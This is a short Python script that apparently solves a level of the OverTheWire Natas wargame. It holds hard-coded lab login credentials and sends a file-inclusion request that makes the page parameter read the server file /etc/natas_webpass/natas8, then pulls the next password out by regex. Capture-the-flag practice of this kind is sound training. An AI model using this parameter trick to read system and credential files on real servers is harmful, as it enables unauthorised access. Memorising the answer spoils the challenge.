import re
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas7', '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9')
def get_pass():
    param = {'page':'/etc/natas_webpass/natas8'}
    r = requests.get('http://natas7.natas.labs.overthewire.org/', auth=auth,params=param)
    pass_regex = '[a-zA-Z0-9]{32}'
    print(re.findall(pass_regex,r.text)[1])
if __name__ == "__main__":
    get_pass()
